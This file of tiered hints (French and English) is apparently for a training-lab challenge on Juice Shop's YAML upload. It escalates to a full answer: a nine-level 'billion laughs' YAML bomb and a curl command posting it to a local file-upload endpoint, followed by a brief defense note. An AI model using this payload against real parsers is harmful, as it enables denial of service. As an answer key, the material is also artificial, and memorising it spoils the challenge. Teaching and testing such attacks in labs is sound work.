challenge_key: "yamlBombChallenge"
schema_version: "juicelab.hints.v2"

hints:
  N1:
    cost_pct: 5
    text_fr: |
      Hint OWASP : "billion laughs YAML". L'attaque classique billion
      laughs (Aaaaaaa) adapte au format YAML via anchors et references.
    text_en: |
      OWASP hint: "billion laughs YAML". Classic billion laughs (Aaaaaaa)
      attack adapted to YAML format via anchors and references.
    pedagogical_intent: |
      Activate YAML bomb reflex.

  N2:
    cost_pct: 10
    text_fr: |
      Endpoint : /#/complain (Customer Complaint), upload .yml ou .yaml
      file. YAML supporte les anchors `&name` (definir) et references
      `*name` (reuser). Une chaine d'anchors qui se references en cascade
      cree expansion exponentielle.
    text_en: |
      Endpoint: /#/complain (Customer Complaint), upload .yml or .yaml
      file. YAML supports anchors `&name` (define) and references
      `*name` (reuse). A chain of anchors referencing in cascade creates
      exponential expansion.
    pedagogical_intent: |
      Spell endpoint + mechanism.

  N3:
    cost_pct: 20
    text_fr: |
      Payload classique YAML bomb :
      ```yaml
      a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol","lol"]
      b: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a, *a]
      c: &c [*b, *b, *b, *b, *b, *b, *b, *b, *b, *b]
      d: &d [*c, *c, *c, *c, *c, *c, *c, *c, *c, *c]
      ```
      Avec 9 niveaux = 10^9 occurrences.
    text_en: |
      Classic YAML bomb payload:
      ```yaml
      a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol","lol"]
      b: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a, *a]
      c: &c [*b, *b, *b, *b, *b, *b, *b, *b, *b, *b]
      d: &d [*c, *c, *c, *c, *c, *c, *c, *c, *c, *c]
      ```
      With 9 levels = 10^9 occurrences.
    pedagogical_intent: |
      Reveal payload structure.

  N4:
    cost_pct: 35
    text_fr: |
      Le serveur parse les .yml/.yaml uploades dans un bac a sable avec
      un timeout de 2000 ms (routes/fileUpload.ts, handleYamlUpload).
      Une "YAML bomb" (billion laughs) utilise des ancres imbriquees
      dont l'expansion est exponentielle : le parseur depasse le timeout
      et leve "Script execution timed out", ce qui resout le challenge.
      Pre-requis : deprecatedInterfaceChallenge actif (upload de fichiers
      legacy).
    text_en: |
      The server parses uploaded .yml/.yaml in a sandbox with a 2000 ms
      timeout (routes/fileUpload.ts, handleYamlUpload). A "YAML bomb"
      (billion laughs) uses nested anchors whose expansion is
      exponential: the parser exceeds the timeout and raises "Script
      execution timed out", which solves the challenge. Prerequisite:
      deprecatedInterfaceChallenge enabled (legacy file upload).
    pedagogical_intent: |
      Explain the exponential-anchor DoS and the timeout trigger.

  N5:
    cost_pct: 50
    text_fr: |
      Solution (verifiee en recette sur Juice Shop 19.2.1, sans auth) :
      cree bomb.yml avec des ancres imbriquees (expansion exponentielle) :
        a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
        b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
        c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
        d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
        e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
        f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
        g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
        h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
        i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
        bomb: *i
      Puis upload :
        curl -s -X POST http://127.0.0.1:3000/file-upload -F "file=@bomb.yml"
      Reponse 503 apres ~2 s (timeout), challenge resolu
      (fileUpload.ts:124). Le formulaire /#/complain fait le meme POST
      /file-upload.
      Defense : limiter la taille/profondeur des documents YAML,
      desactiver l'expansion d'ancres non bornee, et plafonner le temps
      de parsing.
    text_en: |
      Solution (verified during testing on Juice Shop 19.2.1, no auth):
      create bomb.yml with nested anchors (exponential expansion):
        a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
        b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
        c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
        d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
        e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
        f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
        g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
        h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
        i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
        bomb: *i
      Then upload:
        curl -s -X POST http://127.0.0.1:3000/file-upload -F "file=@bomb.yml"
      Response 503 after ~2 s (timeout), challenge solved
      (fileUpload.ts:124). The /#/complain form does the same POST
      /file-upload.
      Defense: limit YAML document size/depth, disable unbounded anchor
      expansion, and cap parsing time.
    pedagogical_intent: |
      Full verified solution: bomb YAML, exact endpoint, defense.
